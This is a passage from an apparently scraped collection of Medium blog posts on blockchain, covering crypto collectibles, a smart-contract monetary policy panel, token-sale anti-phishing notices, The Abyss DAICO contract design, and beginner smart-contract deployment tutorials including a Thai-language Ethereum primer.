blockchain, gaming and collectible app developers can increase trust in the system, while also automating fairness. This means any work of art you purchase on BitPainting will be exclusively yours, and you can know how much it has sold for in the past.The fact that you can only purchase one version of a classic work like the Salvator Mundi on the BitPainting platform\u200a\u2014\u200aas well as the fact that it is verified and secured by the blockchain\u200a\u2014\u200ais a prime example of how blockchain technology is changing the nature of digital assets. In the past, digital works were almost impossible to secure, but now people can use blockchain tools to prevent fraudulent copies. The result will be a massive increase of trust in digital systems.The future of blockchain and crypto collectiblesSolutions provided by these technologies aren\u2019t limited to collectibles, either. Solutions like BitPainting are paving the way for applications that will eventually verify all kinds of information. For example, in the future, when buying a bag of coffee beans at the store, you may be able to verify that it was indeed a fair trade transaction that benefited the farmer who grew it. And imagine opening up your news app in the morning and seeing nothing but verified stories, with fake news already sifted out by a blockchain-based network. This may seem like a distant future, but there are already companies like RedPen working to make this a reality. While projects like mesmr are working towards a future where digital collectibles can be a gateway between creators and fans, or brands and customers.An app like BitPainting could eventually evolve to track physical works of art, or even tracks the transition of digital masterpieces to physical formats.\u201cBringing blockchain technology to bear in the digital asset space holds the promise to create entirely new platforms for value storage and exchange that traditional systems have failed to identify.\u201d\u200a\u2014\u200aIlya Nikolayev, Tapinator\u2019s founder and\u00a0CEOBy creating new ways to store value, crypto collectible apps like BitPainting are making cryptocurrencies a practical tool as much as a monetary vehicle. Users who want to buy a painting will inevitably have a shared interest in the adoption of the tokens used to purchase the painting.Further:By driving interest into this space, companies like Tapinator are creating new ways for people to enter into the market. So even if you don\u2019t think digital collectibles are here to stay, you can at least rejoice in the fact that they\u2019re bringing in fresh blood.\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014I\u2019d like to interview the creators of different digital collectibles, if you or someone you know would like to chat, shoot me a message on telegram. My handle is @RezaJafery.", "responses": ""}, {"title": "BEF Highlights: Will Central Banks Give Way to Smart Contracts?", "author_name": "LATOKEN", "link": "https://blog.latoken.com/will-central-banks-give-way-to-smart-contracts-ad0e483c7e9a?source=search_post", "post_date": "Nov 13, 2017", "readtime": "4 min read", "upvotes": "1K", "content": "BEF Highlights: Will Central Banks Give Way to Smart Contracts?LATOKENBlockedUnblockFollowFollowingNov 13, 2017For centuries, money supply was regulated by central banks. With new cryptocurrencies emerging, the questions arose: are smart contract a better way to regulate money supply? What are the costs and benefits of Decentralized Financial System?Founder of LATOKEN Valentin Preobrazhenskiy discussed those topics with Lawrence H. White (Professor of Economics at George Mason University), Sujit Chakravorti (Chakra Advisors, ex Federal Reserve Bank), Daniel Heller (Fellow at PIIE, ex Executive Director at IMF) and Kenneth Goodwin (Jeanensis Capital Markets, ex US Federal Reserve) at BEF2017 panel on Decentralized Central Banks and The New Financial System.Dual Mandate of the Smart ContractsThe FED has a dual mandate of keeping inflation and unemployment low. If the inflation is too high, the FED raises the interest rates, and if the unemployment is too high the FED lowers. Seems like an easy equation.\u201cIn theory that\u2019s something that you could put in a smart contract. You could have a rule, saying that if unemployment rate is X, then interest rate is Y; if inflation is Z, interest rate is A,\u201d says Daniel.However, he notes, there\u2019s a big snag: reality is too complex, there\u2019re surprises, that can\u2019t be called for and put in a smart contract beforehand.Not for the Extraordinary Time\u201cThere\u2019s an old saying that central banking is science and art. I would say that smart contracts could be part of science, but you always need an element of art, you have to use judgment in your decisions on how to set interest rates,\u201d continues Daniel.Sujit agrees with his colleague: \u201cEverything can\u2019t be written in the contract. There\u2019s always some process. I would find it hard to believe that you could just run the smart contract without ever interfering under any circumstance.\u201dExtraordinary times might lead to extraordinary measures, he concludes.During the financial crisis, if you had just followed the rules, you would have kept interest rates high. But everyone new unemployment will go in the next years, so it was time to react very quickly, and we saw the FED lowered interest rates basically to zero. These are things you can\u2019t put in a smart contract, they mention.\u201cSmart contracts may be good in the sunny days, they may be quite helpful, but but as soon as you are in the middle of a hurricane, you can\u2019t trust the data, artificial intelligence will not solve that, machine learning will not solve that, the simple rules can\u2019t deal with this,\u201d explains Daniel.Forward looking\u00a0rulesThe limitations of smart contracts are related to the fact that the rule is always backward looking. You can take data from the past, you put certain rates on inflation and unemployment. But if you are in a situation when something unprecedented happens, you have to use judgment, you can\u2019t follow the rule that was valid in the past.At the same time central banks don\u2019t always successfully deal with a task of making decisions using forward looking judgments, notes professor White. \u201cIt is important to look forward in making monetary policy, and the great failure of the FED in 2008 was to look forward. And in 2009 we had deflation and falling real income. We put them together and we get falling nominal incomes.\u201dAll in all, \u201cthe beauty of the blockchain, and bitcoin, and other private currencies compete with the dollar, the euro, Venezuelan bolivar etc, and they keep pressure on central banks to do a good job, because if they don\u2019t, they would be replaced,\u201d Daniel concluded.About LATOKENLATOKEN is developing a one-stop multi-asset trading platform, and our goal is to become a leader in the crypto trading market entering Top-20 crypto exchanges by trading volume.To achieve this goal, LATOKEN is building the first decentralized exchange based on DAG technology (directed acyclic graph) that allows unprecedented trading volumes of up to 100 000 transactions per second.LATOKEN Platform already allows trading of major crypto pairs and perspective ICO tokens. We\u2019ve also tested trades of asset tokens linked to prices of hard assets, like shares of blue chips (e.g. Apple, Amazon, Tesla) and commodities (oil, gold, silver). Now we\u2019re working on acquiring all necessary licenses for launching a full-scale trading of asset tokensJoin us to bring the crypto expansion closer. LATOKEN (ticker LA) is now trading on HitBTC and EtherDelta.Apply for KYC in your LATOKEN Wallet (takes 1\u20133 weeks) to trade asset tokens on the LATOKEN Platform (currently not available for the US contributors).\u00a0To keep up to date with all our news, join discussions in our Telegram Chat, where LATOKEN Team is ready to answer all your questions 24/7.To keep up to date with all our news, join discussions in our Telegram Chat\u200a\u2014\u200at.me/latoken", "responses": "2"}, {"title": "Protecting the SIRIN LABS Crowdsale Smart Contract\u00a0Address", "author_name": "SIRIN LABS", "link": "https://blog.sirinlabs.com/protecting-sirin-labs-crowdsale-smart-contract-address-8a5d50e3676e?source=search_post", "post_date": "Dec 12, 2017", "readtime": "2 min read", "upvotes": "408", "content": "Protecting the SIRIN LABS Crowdsale Smart Contract\u00a0AddressSIRIN LABSBlockedUnblockFollowFollowingDec 12, 2017To better protect SRN token buyers and avoid fake addresses and phishing attempts we have registered our smart contract and SRN token on Etherscan and MyEtherWallet.Contributors are able to verify the authenticity of the SIRIN LABS smart contract address on myetherwallet.com prior to sending their transaction.The \u201cSend Ether & Tokens\u201d page on MyEtherWallet will show a message on the bottom of the page when it identifies SIRIN LABS\u2019 crowdsale address in the \u2018To Address\u2019 field.Verification that the correct SIRIN LABS address was input in the \u2018To Address\u2019\u00a0fieldSIRIN LABS would like to emphasis the following to the community:1. The smart contract address will be published only on our website https://sirinlabs.com. Please be aware that there are scammers trying to publish fake websites with similar URLs on Telegram, social media and even google adds, we have already taken down a few of them.2. No one from the SIRIN LABS team will send the smart contract address in a direct message or email.3. Do not trust any individual sending an address directly, even if he is using a familiar name.4. Contributors are strongly advised not to access websites via links, but instead by directly typing the address into the URL bar or by bookmarking the original website.5. Please do not contribute your ETH from an exchange wallet, only from an ERC-20 compatible wallet.6. SIRIN LABS has developed a tutorial video which explains how to contribute to the crowdsale safely and efficiently.Let\u2019s ensure that the crowdsale continues with the same excellent level of security!The SIRIN LABS team.", "responses": "1"}, {"title": "Bluzelle Token Smart Contract\u00a0Address", "author_name": "Pavel Bains", "link": "https://blog.bluzelle.com/bluzelle-token-smart-contract-address-1e4de2b3b56f?source=search_post", "post_date": "Jan 15, 2018", "readtime": "", "upvotes": "131", "content": "Bluzelle Token Smart Contract\u00a0AddressPavel BainsBlockedUnblockFollowFollowingJan 15, 2018To ensure security for everyone, we are publishing the Bluzelle Token Smart Contract Address here and other places. When participating in our crowd sale, this is the ONLY address you will send ETH to. Anything else is fake.0xbc05e610eaac542bfa64504025413291beb58d36BEWARE OF SCAMSIGNORE ANY AND ALL SITES THAT ARE NOT BLUZELLE.COM. THE BLUZELLE ICO IS CLOSED TO ANYONE WHO HAS NOT ALREADY SUCCESSFULLY COMPLETED WHITELIST AND KYC (YOU CAN CHECK ON WEBSITE VIA ETH ADDRESS). THERE IS NO PRESALE. ANY SITE CLAIMING SO IS FALSE. PROTECT YOURSELF. WE WOULD NEVER PM YOU AND ASK YOU TO SEND US FUNDS.", "responses": "1"}, {"title": "Guide to The Abyss DAICO Smart\u00a0Contract", "author_name": "The \u0410byss Team", "link": "https://medium.com/theabyss/a-guide-to-the-abyss-daico-smart-contract-b66a04bddaa?source=search_post", "post_date": "Apr 7, 2018", "readtime": "9 min read", "upvotes": "199", "content": "Guide to The Abyss DAICO Smart\u00a0ContractTi\u1ebfng Vi\u1ec7t | \ud55c\uad6d\uc5b4 | \u65e5\u672c\u8a9e | \u4e2d\u6587 |\u00a0\u0420\u0443\u0441\u0441\u043a\u0438\u0439The \u0410byss TeamBlockedUnblockFollowFollowingApr 7, 2018Dear all, it\u2019s been a while since we presented you the first version of our DAICO smart contract. Over two months of hard working have resulted in adding new features, aimed at conducting even safer and more transparent DAICO, and removing some of the features that appeared ineffective. The project\u2019s concept has evolved. And being its technical implementation, the smart contract has evolved respectively. We\u2019re now presenting a guide to the renewed DAICO smart contract for your careful examination and consideration.It is fully exposed on the Github, and is currently undergoing the audition by the independent reputable New Alchemy ($1 999 386 274 total market cap of their clients as of Apr 7, 2018). Below is a detailed description of how things will be working during the upcoming DAICO.During The Abyss Token Sale (DAICO) the project will utilize five smart contracts:Crowdsale (TheAbyssDAICO) contract. This smart contract is meant for crowdsale and will not be used after the end of crowdsale.Fund (PollManagedFund) contract. This smart contract is meant for storing contributed ETH.Tokens (ABYSS) contract. This is our main smart contract which will be operational after the end of crowdsale.Reservation Fund (ReservationFund) contract. This smart contract is meant for storing ETH contributed by greylist participants.Utility contract (LockedTokens). This smart contract is meant for locking the Company\u2019s, Reserve and Foundation tokens for a certain time period.The Tokens contract is created after the crowdsale is deployed. It is meant for generating tokens, which will be unlocked after the end of Token Sale.Reservation Fund and\u00a0GreylistThe Reservation Fund contract serves for storing the greylisted contributors\u2019 ETH.We added an opportunity to send ETH before the KYC/AML is complete. Such contributors are added to greylist after the transaction is made [view source].If a person is not catching up with the KYC/AML procedure, but sends ETH during the bonus program period, his bonus is reserved as of the day of transaction. After he passes the KYC/AML successfully, he is redirected from greylist to the whitelist [view source], which means that his contribution is transferred from the Reservation Fund contract to the Fund contract. After this, both purchased and bonus tokens are accrued.Processing of greylist paymentThe Hard Cap comprises whitelisted participants\u2019 contributions only. If a person fails to pass KYC/AML (or fails to pass it in time, or rather the Hard Cap is already reached), after the end of crowdsale he can make a refund and return his contribution [view source].Refund of greylist paymentCrowdsaleWhen contribution is made, the contract verifies that its amount corresponds to [view source]:Days 1Days 2+If contribution is made within crowdsale start-end delta time, the respective amount of tokens (with bonus tokens also considered) is generated by the Tokens contract, while ETH is sent and stored at the Fund contract. This scheme is operational until the end of crowdsale.Processing of contributed ETHBonus programDuring crowdsale bonus program will be operational, with bonus tokens generated by the Tokens contract.BonusesThe Tokens contract is created automatically after the start of crowdsale. It is meant for generating tokens, which will be unlocked after the end of Token Sale.Crowdsale resultsThe crowdsale may result in failing to reach the Soft Cap level or reaching the Soft Cap level.Soft Cap\u200a\u2014\u200anot\u00a0reachedIf the project fails to reach the Soft Cap level (6M USD), tokens remain locked and can not be transferred from one user wallet to anotherSoft Cap is not reachedFund contract automatically switches to the CrowdsaleRefund mode, allowing contributors to return the raised ETH.Crowdsale refundSoft Cap / Hard Cap\u200a\u2014\u200areachedRaising the Soft Cap means the project either reached the Hard Cap (18M USD + 300 000 BNB), or not.The total funds raised are verified so that the Hard Cap level is not exceeded [view source]. If the Hard Cap is exceeded, the transaction is reverted. On reaching the Hard Cap, the crowdsale stops [view source].Tokens distributionAfter the crowdsale is complete:The BNB tokens are transferred to the bnbTokenWallet;The referral program tokens are transferred to the referralTokenswallet;The foundation tokens are transferred to the foundationTokenswallet;The company tokens are transferred to the companyTokenswallet;The reserve tokens are transferred to the reserveTokenswallet;The advisors tokens are transferred to the advisorsTokenWallet;The bounty tokens are transferred to the bountyTokenWallet.The company, advisors, crowdsale, foundation and bounty tokens are distributed by smart contract as follows:Token distributionABYSS tokens assigned to the Company will be frozen by the smart contract for a period of 2 year [view source]. Advisors tokens are not subject to vesting period and will be transferred to the project\u2019s advisors after the end of Token Sale.ABYSS tokens assigned to Crowdsale include bonus and referral tokens. Depending on the number of bonus tokens distributed during crowdsale, the amount of referral tokens will range from 2.91% to 3.64%.ABYSS tokens assigned to the Foundation will be frozen by the smart contract for a period of 1 year [view source].ABYSS tokens assigned for Reserve will be frozen by the smart contract for a period of 6 months [view source].Finalizing of CrowdsaleWithdrawal of\u00a0fundsAfter the crowdsale is complete, the Fund contract switches to the TeamWithdraw mode, allowing the project\u2019s team to withdraw limited amount of raised funds periodically.There are two ways the raised funds can be disbursed by the Fund contract to the developing team:1. The first withdrawThere is a possibility for the Team to withdraw \u00bd of Soft Cap right after the end of crowdsale [view source].These funds will be converted to fiat money. It is the project\u2019s protection mechanism due to the high volatility of ETH price.The first withdraw2. Tap (wei/sec)A reasonable maximum amount that team can receive from the Fund contract per month. The initial project\u2019s tap, established by smart contract, is 192901234567901 (wei/sec) = 500 ETH/month [view source].The tap is meant for supporting the platform\u2019s development process. If the tap is not disbursed, it keeps accumulating over time.Tap withdrawThe tap increase poll [view\u00a0source]If the team needs more funds for whichever reason, it can launch a poll either for raising the tap.Token holders can vote, depending on the amount of tokens they hold on their wallets (N, where N\u22600), if they approve of the disbursement of extra funds or not.Prevention (Proof-of-Stake algorithm) protocols have been included to protect against abuse by large token holders like exchanges. The weight of each Ethereum-wallet\u2019s vote is limited by a certain amount of tokens [view source]:The company, foundation and reserve tokens, that are locked by the smart contract, are not eligible to vote with because they are stored on the smart contract.Voting for tap increase can be held on 10th day of each month [view source]. It is considered a success if \u201cYES\u201d votes exceed \u201cNO\u201d. The voting process lasts 3 days [view source], and starts immediately after initiation. To prevent the abuse of the system, the %, by which the tap may be raised at a time, is limited to 50% of the initial amount [view source].After the poll is closed, votes are not accepted [view source]:Checking time for VotingThe tap increase poll results are visible to all participants.QuorumThe poll is considered fulfilled, if a certain quorum is reached (X% of TotalTokenSupply):The first poll though requires no quorum (X%=0) [view source]. The required quorum for all subsequent polls is adjusted automatically [view source], and calculated this way:If YesVoteTokens > NoVoteTokens, the tap amount is raised [view source]. Or vice-versa.The Refund voting [view\u00a0source]Token Holders can refund the remaining contributed money if they deem that the project team shows unsatisfactory performance (failing to implement the project).Prevention (Proof-of-Stake algorithm) protocols have been included to protect against abuse by large token holders like exchanges. The weight of each Ethereum-wallet\u2019s vote is limited by a certain amount of tokens [view source]:The company, foundation and reserve tokens, that are locked by the smart contract, are not eligible to vote with because they are stored on the smart contract.The refund poll will be summoned once a quarter: more specifically, on July 1, October 1, January 1, April 1 of the respective year. The voting lasts 1 week, and starts immediately after initiation. The refund is available during 2 years (after the end of crowdsale), with the last refund poll starting on April 1, 2020 [view source].Dates of Refund PollThe refund poll is considered a success if more \u201cYes\u201d than \u201cNo\u201d and more than 1/3 of tokens (from total token supply) voted for refund [view source].Minimum limit for RefundIf the refund poll is success, token holders should keep their tokens, and abstain from transferring them to another ETH wallet before the 1st day of the next month. In this case the poll will be considered accomplished. The token holder\u2019s current vote weight will decrease if tokens are transferred. For example, if a person voted with 1000 tokens and moved 500 of them to another wallet, then his vote weight is reduced to 500 instead of 1000. Following this logic, if tokens are transferred before the 1st day of the next month, resulting in the tokens overall amount decrease below the level needed for a refund, then the refund poll fails [view source].If tokens are kept till the 1st day of the next month, withdraw for the Team is blocked [view source], and the second refund voting is to be conducted within a month [view source]. If the second refund voting ends successfully, token holders can return the remaining funds. If failed, the withdraw for the Team is unlocked [view source].This two-stage voting system is introduced in order to protect the project from token holders\u2019 momentary (hasty) decisions caused by drastic changes in the cryptocurrency market.If the refund occurs, after burning the company, reserve and foundation tokens [view source] the contributed ETH is returned [view source], with user\u2019s tokens bought out at the rate of the day, calculated with formula:Returning of remaining ETHThe refund poll results are visible to all participants.The U.S. citizens and residents [view\u00a0source]Under relevant U.S. securities regulations, tokens sold to U.S. accredited investors will be frozen for a period of 1 year [view source].U.S. tokens lockBinance (BNB) tokens [view\u00a0source]We have additional Hard Cap for our Token Sale and it is nominated in BNB tokens [view source] with:BNB tokens are not subject to vesting period and withdrawn to the wallet of the developing team after the end of crowdsale [view source].BNB tokens contributions are not considered in the Soft Cap. However, in case the Soft Cap is not reached, there will be possibility to return BNB tokens to the wallets they were sent from without our intervention [view source].The total funds raised are verified so that the Hard Cap level is not exceeded [view source]. If the Hard Cap is exceeded, the transaction is reverted.Course for BNB will be set in a few days before the start of Token Sale depending on the ETH market rate [view source]. BNB tokens are accepted from the international (non U.S.) participants only [view source].ConclusionThe Abyss Token Sale (DAICO) is scheduled for April 18, 2018 (14:00 UTC), closing on May 16, 2018 (14:00 UTC) [view source].We believe that this system gives an unprecedented level of security, transparency and control, at the same time representing a refreshing development for an ICO practice that has produced so many fraudulent schemes.", "responses": "4"}, {"title": "How to Deploy a Smart Contract in 5\u00a0Minutes", "author_name": "Travis Reeder", "link": "https://medium.com/gochain/how-to-deploy-a-smart-contract-in-5-minutes-bed2443be23c?source=search_post", "post_date": "Aug 16, 2018", "readtime": "2 min read", "upvotes": "739", "content": "How to Deploy a Smart Contract in 5\u00a0MinutesTravis ReederBlockedUnblockFollowFollowingAug 16, 2018UPDATE FEB 7, 2019: Want to do it in 3 minutes? Check out the new web3 tool that makes all of this WAY easier: https://github.com/gochain-io/web3Creating and deploying Ethereum based smart contracts has never been a simple task. Typically requiring you to use some complicated framework, run a local node and/or develop in a barely usable online editor. Today I\u2019ll show how easy it is to deploy a contract to GoChain.PrerequisitesYou will need a few things before we get started:Install Visual Studio Code (you should already be using this if you\u2019re a developer anyways)Install the VS Code Solidity extensionGet some GO\u200a\u2014\u200aAsk for some free testnet GO in our Testnet Telegram or buy some on KuCoin to deploy to mainnetCompile your\u00a0ContractLet\u2019s take the simple token code from the Ethereum website, it looks like this:Copy that code and paste it into a new file called mytoken.sol in VS CodePress F5 to compileThis will create a few files in a bin/ directory, open MyToken.bin\u00a0. This contains your contract bytecode, which you\u2019ll use below.Now you have the bytecode for your contract, let\u2019s deploy it!Deploy your\u00a0ContractThis is really easy using the GoChain Wallet:Go to https://wallet.gochain.io/In the top right, choose TestNetClick Open WalletPaste your private key for your testnet wallet that has the GO you got from our TelegramClick Deploy ContractCopy the contents of MyToken.bin into the Bytecode fieldClick Send!After a few seconds your contract will be deployed and you\u2019ll get a contract address, copy the address and save it somewhere. That address is what people will use to interact with your contract.Next StepsAfter you\u2019ve deployed your contract, you\u2019ll want to use it. There are many ways people can interact with your contracts, whether it\u2019s sending GO directly to it, using the GoChain Wallet, using MyEtherWallet, or using a DApp that uses it. We won\u2019t go into that in this post as we could write several other posts on that part and it depends on what your contract does.We know it can be intimidating to know where to start when you first get into developing smart contracts, I hope this post helps you see how easy it can be.More documentation at: https://github.com/gochain-io/docs", "responses": ""}, {"title": "Deploy Smart Contract on TRON Blockchain", "author_name": "Niharika Singh", "link": "https://medium.com/coinmonks/deploy-smart-contract-on-tron-blockchain-204f895917c6?source=search_post", "post_date": "Feb 12", "readtime": "4 min read", "upvotes": "715", "content": "Deploy Smart Contract on TRON BlockchainNiharika SinghBlockedUnblockFollowFollowingFeb 12In this article, I gave a gentle introduction to the TRON blockchain. We discussed the following agendas:What is TRON and What do they want to doFuture of TRON: Project AtlasThe inner working of TRONFuture of TRX (the cryptocurrency of the TRON blockchain)Since we are clear on the above-mentioned agendas, I think it is the right time to deploy a dApp on the TRON blockchain. This article is going to be about how we can use the TRON blockchain as a virtual machine.", "responses": "5"}, {"title": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 0\u00a0: \u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19 Ethereum, Smart Contract \u0e17\u0e35\u0e48\u0e04\u0e27\u0e23\u0e23\u0e39\u0e49\u0e41\u0e25\u0e30 Plasma \u0e04\u0e23\u0e48\u0e32\u0e27\u00a0\u0e46", "author_name": "Methus Kaewsaikao", "link": "https://medium.com/cochain/ethereum-%E0%B8%95%E0%B8%AD%E0%B8%99%E0%B8%97%E0%B8%B5%E0%B9%88-0-%E0%B8%9E%E0%B8%B7%E0%B9%89%E0%B8%99%E0%B8%90%E0%B8%B2%E0%B8%99-ethereum-smart-contract-%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%84%E0%B8%A7%E0%B8%A3%E0%B8%A3%E0%B8%B9%E0%B9%89%E0%B9%81%E0%B8%A5%E0%B8%B0-plasma-%E0%B8%84%E0%B8%A3%E0%B9%88%E0%B8%B2%E0%B8%A7-%E0%B9%86-c13b3c0b9b78?source=search_post", "post_date": "May 8", "readtime": "4 min read", "upvotes": "117", "content": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 0\u00a0: \u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19 Ethereum, Smart Contract \u0e17\u0e35\u0e48\u0e04\u0e27\u0e23\u0e23\u0e39\u0e49\u0e41\u0e25\u0e30 Plasma \u0e04\u0e23\u0e48\u0e32\u0e27\u00a0\u0e46Methus KaewsaikaoBlockedUnblockFollowFollowingMay 8\u0e43\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e0b\u0e35\u0e23\u0e35\u0e48\u0e2a\u0e4c\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e17\u0e33\u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49\u0e08\u0e31\u0e01 Ethereum Blockchain \u0e41\u0e25\u0e30\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e1a\u0e19 Ethereum \u0e42\u0e14\u0e22\u0e01\u0e48\u0e2d\u0e19\u0e2d\u0e37\u0e48\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e1b\u0e39\u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19\u0e04\u0e23\u0e48\u0e32\u0e27 \u0e46 \u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e01\u0e31\u0e1a Ethereum \u0e01\u0e31\u0e19\u0e01\u0e48\u0e2d\u0e19Ethereum \u0e16\u0e39\u0e01\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e42\u0e14\u0e22 Vitalik Buterin \u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e43\u0e19\u0e1b\u0e35 2013 \u0e17\u0e35\u0e48 Vitalik \u0e44\u0e14\u0e49\u0e40\u0e2a\u0e19\u0e2d\u0e43\u0e2b\u0e49 Bitcoin \u0e21\u0e35 Scripting Language \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19 Turing Complete \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e19\u0e31\u0e01\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e23\u0e49\u0e32\u0e07 Application \u0e1a\u0e19 Bitcoin \u0e44\u0e14\u0e49 \u0e41\u0e15\u0e48\u0e16\u0e39\u0e01\u0e1b\u0e0f\u0e34\u0e40\u0e2a\u0e18\u0e08\u0e32\u0e01\u0e01\u0e25\u0e38\u0e48\u0e21\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32 BitcoinVitalik \u0e40\u0e25\u0e22\u0e40\u0e23\u0e34\u0e48\u0e21\u0e2a\u0e23\u0e49\u0e32\u0e07 Ethereum \u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e42\u0e14\u0e22\u0e21\u0e35\u0e04\u0e33\u0e08\u0e33\u0e01\u0e31\u0e14\u0e04\u0e27\u0e32\u0e21\u0e17\u0e35\u0e48\u0e27\u0e48\u0e32 \u201cDecentralised mining network and software development platform rolled into one\u201d \u0e01\u0e25\u0e48\u0e32\u0e27\u0e04\u0e37\u0e2d Ethereum \u0e40\u0e1b\u0e47\u0e19 Network \u0e02\u0e2d\u0e07\u0e2a\u0e34\u0e19\u0e17\u0e23\u0e31\u0e1e\u0e22\u0e4c\u0e17\u0e35\u0e48\u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23\u0e02\u0e38\u0e14\u0e40\u0e2b\u0e21\u0e37\u0e2d\u0e19 Bitcoin \u0e41\u0e15\u0e48\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e04\u0e27\u0e32\u0e21\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e0b\u0e2d\u0e1f\u0e15\u0e4c\u0e41\u0e27\u0e23\u0e4c\u0e1a\u0e19\u0e2a\u0e34\u0e19\u0e17\u0e23\u0e31\u0e1e\u0e22\u0e4c\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22 \u0e0b\u0e36\u0e48\u0e07\u0e0b\u0e2d\u0e1f\u0e15\u0e4c\u0e41\u0e27\u0e23\u0e4c\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e35\u0e22\u0e01\u0e01\u0e31\u0e19\u0e27\u0e48\u0e32 Smart ContractEthereum \u0e19\u0e31\u0e49\u0e19\u0e23\u0e30\u0e14\u0e21\u0e17\u0e38\u0e19\u0e14\u0e49\u0e27\u0e22 Bitcoin \u0e42\u0e14\u0e22\u0e43\u0e19\u0e23\u0e2d\u0e1a Pre-sale \u0e19\u0e31\u0e49\u0e19\u0e21\u0e35\u0e23\u0e32\u0e04\u0e32 2000 Ether/1 Bitcoin \u0e0b\u0e36\u0e48\u0e07 Ethereum \u0e19\u0e31\u0e1a\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19 ICO \u0e15\u0e31\u0e27\u0e41\u0e23\u0e01 \u0e46 \u0e43\u0e19\u0e42\u0e25\u0e01Smart Contract \u0e1a\u0e19 Ethereum \u0e08\u0e30\u0e16\u0e39\u0e01\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e14\u0e22\u0e20\u0e32\u0e29\u0e32 Solidity \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e20\u0e32\u0e29\u0e32\u0e17\u0e35\u0e48\u0e16\u0e39\u0e01\u0e2d\u0e2d\u0e01\u0e41\u0e1a\u0e1a\u0e21\u0e32\u0e43\u0e2b\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e17\u0e33\u0e07\u0e32\u0e19\u0e1a\u0e19 Machine \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19 Ethereum \u0e42\u0e14\u0e22\u0e40\u0e09\u0e1e\u0e32\u0e30 \u0e42\u0e14\u0e22\u0e08\u0e30\u0e21\u0e35\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e42\u0e04\u0e49\u0e14\u0e41\u0e1a\u0e1a\u0e19\u0e35\u0e49pragma solidity ^0.5.0;contract HelloWorld {    function sayHello() public pure returns(string memory){        return \"hello world\";    }}\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21\u0e1a\u0e19 Ethereum \u0e19\u0e31\u0e49\u0e19\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Backend Server \u0e40\u0e1e\u0e23\u0e32\u0e30 Ethereum \u0e19\u0e31\u0e48\u0e19\u0e41\u0e2b\u0e25\u0e30\u0e04\u0e37\u0e2d Backend Server \u0e41\u0e15\u0e48\u0e40\u0e1b\u0e47\u0e19 Server \u0e41\u0e1a\u0e1a\u0e01\u0e23\u0e30\u0e08\u0e32\u0e22\u0e28\u0e39\u0e19\u0e22\u0e4c\u0e01\u0e25\u0e32\u0e07\u0e42\u0e14\u0e22\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e40\u0e23\u0e32\u0e21\u0e35 Smart Contract \u0e1a\u0e19 Ethereum \u0e41\u0e25\u0e49\u0e27 User \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e0a\u0e49 Client (\u0e40\u0e0a\u0e48\u0e19 Web Browser + Web3.js \u0e2b\u0e23\u0e37\u0e2d Myetherwallet + ABI) \u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e44\u0e1b\u0e2b\u0e32 Ethereum \u0e44\u0e14\u0e49\u0e40\u0e25\u0e22\u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Backend Server (Server \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49 Serve Frontend/\u0e23\u0e31\u0e1a Notification/Cache \u0e41\u0e25\u0e30\u0e40\u0e01\u0e47\u0e1a\u0e23\u0e39\u0e1b\u0e01\u0e47\u0e40\u0e1e\u0e35\u0e22\u0e07\u0e1e\u0e2d)\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c CryptoKitties \u0e0b\u0e36\u0e48\u0e07\u0e43\u0e0a\u0e49 Web3.js \u0e41\u0e25\u0e30 Login With\u00a0Metamask\u0e2b\u0e23\u0e37\u0e2d User \u0e08\u0e30\u0e43\u0e0a\u0e49 Myetherwallet \u0e44\u0e1b\u0e04\u0e38\u0e22\u0e01\u0e31\u0e1a CryptoKitties Smart Contract \u0e15\u0e23\u0e07 \u0e46\u00a0\u0e01\u0e47\u0e44\u0e14\u0e49Smart Contract 